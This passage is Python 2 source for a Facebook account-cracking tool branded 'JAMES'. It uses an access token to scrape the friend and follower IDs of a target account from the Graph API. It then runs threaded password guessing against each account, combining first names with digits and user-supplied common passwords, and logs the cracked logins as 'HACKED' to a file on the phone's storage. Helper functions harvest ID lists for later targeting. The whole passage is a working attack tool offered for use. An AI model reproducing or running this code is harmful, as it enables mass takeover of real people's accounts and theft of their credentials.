    a_s()


def name_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93m~~~~ NAME + DIGIT PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    n_s()


def n_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;93m Select One : ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ NAME + DIGIT PASS PUBLIC CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;91mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        idt = raw_input(' \x1b[1;93m[★]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;93m~~~~NAME PASS PUBLIC CRACKING~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;92mPress enter to try again ')
            name_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ NAME PASS FOLLOWERS CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print ' \x1b[1;91mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[5]Password: ')
        pass7 = raw_input(' \x1b[1;92m[5]Password: ')
        pass8 = raw_input(' \x1b[1;92m[5]Password: ')
        idt = raw_input(' \x1b[1;93m[★]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;93m~~~~ NAME PASS FOLLOWERS CRACKING ~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ NAME + DIGIT PASS FILE CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;91mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        try:
            idlist = raw_input(' \x1b[1;96m[★] File Name:  ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print ' \x1b[1;93mTotal ids: \x1b[1;96m ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;91mCrack Running\x1b[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92mWE ARE MAKING SYSTEM\x1b[1;91m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass1
                cp = open('JAMES_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass2
                    cp = open('JAMES_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass3
                        cp = open('JAMES_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass4
                            cp = open('JAMES_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass5
                                cp = open('JAMES_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass6
                                    cp = open('JAMES_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass7
                                        cp = open('JAMES_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass8
                                            cp = open('JAMES_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[1;93mPress enter to back')
    auto_crack()

def crack_b():
    global toket
    
    try:
	toket=open('login.txt','r').read()
    except (KeyError, IOError):
	os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1m~~~~ NAME+DIGIT AND DIGIT PASS ~~~~'
    print ''
    print '\033[1;92m[1] Public id cloning'
    print '\033[1;92m[2] Followers cloning'
    print '\033[1;92m[3] File cloning'
    print '\033[1;92m[0] Back'
    print ''
    a_s()
    
def digit_crack():
    global token
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1m~~~~ NAME+DIGIT AND DIGIT CRACKING ~~~~'
    print ''
    print '\033[1;92m[1] Public id cloning'
    print '\033[1;92m[2] Followers cloning'
    print '\033[1;92m[3] File cloning'
    print '\033[1;92m[0] Back'
    print ''
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \033[1;93mSelect One: ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ NAME+DIGIT AND DIGIT PUBLIC CRACKING ~~~~'
        print ''
        print '\033[1;93m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
	p6 = raw_input(' \033[1;92m[6]Name + digit: ')
        pass7 = raw_input(' \033[1;92m[7]Password: ')
        pass8 = raw_input(' \033[1;92m[8]Password: ')
	pass9 = raw_input(' \033[1;92m[9]Password: ')
	pass10 = raw_input(' \033[1;92m[10]Password: ')
	pass11 = raw_input(' \033[1;92m[11]Password: ')
	pass12 = raw_input(' \033[1;92m[12]Password: ')
        idt = raw_input(' \033[1;93m[★]Enter id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\033[1;31;1m~~~~NAME+DIGIT AND DIGIT PUBLIC CRACKING~~~~'
            print ''
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' \033[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ NAME+DIGIT AND DIGIT FOLLOWERS CRACKING ~~~~'
        print ''
        print ' \033[1;93mFor example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
	p6 = raw_input(' \033[1;92m[6]Name + digit: ')
        pass7 = raw_input(' \033[1;92m[7]Password: ')
        pass8 = raw_input(' \033[1;92m[8]Password: ')
	pass9 = raw_input(' \033[1;92m[9]Password: ')
	pass10 = raw_input(' \033[1;92m[10]Password: ')
	pass11 = raw_input(' \033[1;92m[11]Password: ')
	pass12 = raw_input(' \033[1;92m[12]Password: ')
        idt = raw_input(' \033[1;93m[★]Enter id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\033[1;31;1m~~~~ NAME+DIGIT AND DIGIT FOLLOWERS CRACKING ~~~~'
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('\033[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ NAME+DIGIT AND DIGIT FILE CRACKING ~~~~'
        print ''
        print '\033[1;93m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
	p6 = raw_input(' \033[1;92m[6]Name + digit: ')
        pass7 = raw_input(' \033[1;92m[7]Password: ')
        pass8 = raw_input(' \033[1;92m[8]Password: ')
	pass9 = raw_input(' \033[1;92m[9]Password: ')
	pass10 = raw_input(' \033[1;92m[10]Password: ')
	pass11 = raw_input(' \033[1;92m[11]Password: ')
	pass12 = raw_input(' \033[1;92m[12]Password: ')
        
        try:
	    idlist= raw_input('[+] File Name: ')
	    for line in open(idlist ,'r').readlines():
	        id.append(line.strip())
	except IOError:
	    print"[!] File Not Found."
	    raw_input('Press Enter To Back. ')
	    crack()
        
    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        print ''
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \033[1;93mCrack Running '
    time.sleep(0.5)
    print ''
    print 46 * '-'
    print ''
    print ' \033[1;92WE ARE MAKING SYSTEM'
    print ''
    print 46 * '-'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass1
                cp = open('JAMES_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass3
                        cp = open('JAMES_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass4
                            cp = open('JAMES_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
			else:
                            pass5 = name.lower() + p5
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass5
                                cp = open('JAMES_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
			    else:
			        pass6 = name.lower() + p6
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass6
                                    cp = open('JAMES_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
			        else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                       print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass7
                                       cp = open('JAMES_CP.txt', 'a')
                                       cp.write(uid + ' | ' + pass7 + '\n')
                                       cp.close()
                                       cps.apppend(uid + pass7)
				    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers = header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                           print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass8
                                           cp = open('JAMES_CP.txt', 'a')
                                           cp.write(uid + ' | ' + pass8 + '\n')
                                           cp.close()
                                           cps.apppend(uid + pass8)
				        else:
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers = header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                               print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass9
                                               cp = open('JAMES_CP.txt', 'a')
                                               cp.write(uid + ' | ' + pass9 + '\n')
                                               cp.close()
                                               cps.apppend(uid + pass9)
					    else:
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers = header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                   print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass10
                                                   cp = open('JAMES_CP.txt', 'a')
                                                   cp.write(uid + ' | ' + pass10 + '\n')
                                                   cp.close()
                                                   cps.apppend(uid + pass10)
			                        else:
                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass11, headers = header).text
                                                    q = json.loads(data)
                                                    if 'loc' in q:
                                                        print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass11 + '\x1b[0;97m'
                                                        ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                                        ok.write(uid + ' | ' + pass11 + '\n')
                                                        ok.close()
                                                        oks.append(uid + pass11)
                                                    elif 'www.facebook.com' in q['error']:
                                                       print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass11
                                                       cp = open('JAMES_CP.txt', 'a')
                                                       cp.write(uid + ' | ' + pass11 + '\n')
                                                       cp.close()
                                                       cps.apppend(uid + pass11)
			                            else:
                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers = header).text
                                                        q = json.loads(data)
                                                        if 'loc' in q:
                                                            print '\033[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass12 + '\x1b[0;97m'
                                                            ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                                            ok.write(uid + ' | ' + pass12 + '\n')
                                                            ok.close()
                                                            oks.append(uid + pass12)
                                                        elif 'www.facebook.com' in q['error']:
                                                           print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass12
                                                           cp = open('JAMES_CP.txt', 'a')
                                                           cp.write(uid + ' | ' + pass12 + '\n')
                                                           cp.close()
                                                           cps.apppend(uid + pass12)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \033[1;92mCrack Done'
    print ' \033[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' \033[1;93mPress enter to back')
    auto_crack()
    
def ex_id_flo():
    global token
    idg = []
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print '\t\x1b[1;91mToken not found'
        print ''
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\t\x1b[1;92mCreating File From Flower'
    print ''
    idh = raw_input('\x1b[1;93m Enter Id: ')
    limit = raw_input("[+] Limit [Max 3000] : ")
    try:
    	
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print ' Collecting From: ' + q['name']
    except KeyError:
        print ''
        print '\tInvalid id provided'
        print ''
        raw_input(' Press Enter To Back')
        menu()
    r = requests.get("https://graph.facebook.com/"+idh+"/subscribers?limit="+limit+"&access_token="+token, headers=header)
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print ''
    print 47 * '-'
    print '\x1b[1;92m The Process Has Completed'
    print '\x1b[1;93m Total ids: \x1b[1;92m' + str(len(idg))
    print 47 * '-'
    print ''
    raw_input('\x1b[1;95m Press enter to download file')
    os.system('cat ids_friends.txt | grep "1" > /sdcard/followids.txt')
    os.system('rm -rf ids_friends.txt')
    print '\x1b[1;93m File downloaded successfully'
    print '\x1b[1;92m Saved /sdcard/followids.txt'
    time.sleep(1)
    menu()
    
def ex_id():
    global token
    idg = []
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print '\tToken not found'
        print ''
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\tCreating File Just Wait A Minute'
    print ''
    idh = raw_input(' Enter Id: ')
    try:
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print ' Collecting from: ' + q['name']
    except KeyError:
        print ''
        print '\tInvalid id provided'
        print ''
        raw_input(' Press enter to back')
        menu()

    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total ids: ' + str(len(idg))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to download file')
    os.system('cp ids_friends.txt /sdcard')
    os.system('rm -rf ids_friends.txt')
    print ' File downloaded successfully👉ids_friends.txt'
    time.sleep(1)
    menu() 

def lout():
	os.system('rm -rf access_token.txt')
	print ' Successfully Delete Token'
	time.sleep(1)
	log_menu_s()

  
if __name__ == '__main__':
	menu()

